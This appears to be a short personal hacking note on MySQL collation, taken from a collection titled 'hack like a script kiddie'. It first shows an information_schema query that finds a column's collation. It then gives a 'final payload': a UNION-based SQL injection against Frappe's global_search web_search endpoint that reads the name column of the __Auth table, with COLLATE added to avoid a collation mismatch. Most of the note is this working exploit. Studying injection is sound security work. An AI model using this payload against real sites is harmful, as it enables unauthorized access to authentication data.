---
{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/mysql/collation-my-sql/","noteIcon":"","created":"2025-04-15T14:11:19.606-04:00"}
---

















Find out the collation of the columns in the __global_search table. 
Check for `utf8mb4_general_ci`

there are collations like "utf8mb4_general_ci" that are case-insensitive (indicated by the "ci" at the end of the collation name). These collations will not take the case into consideration when comparing values

```
SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
```

![](https://i.imgur.com/l5sygaS.png)


The final payload
```
cmd=frappe.utils.global_search.web_search&text=text_test&scope=testscope" union select 1,2,3,4, name COLLATE utf8mb4_general_ci FROM __Auth#
```
![](https://i.imgur.com/NdmDO0p.png)
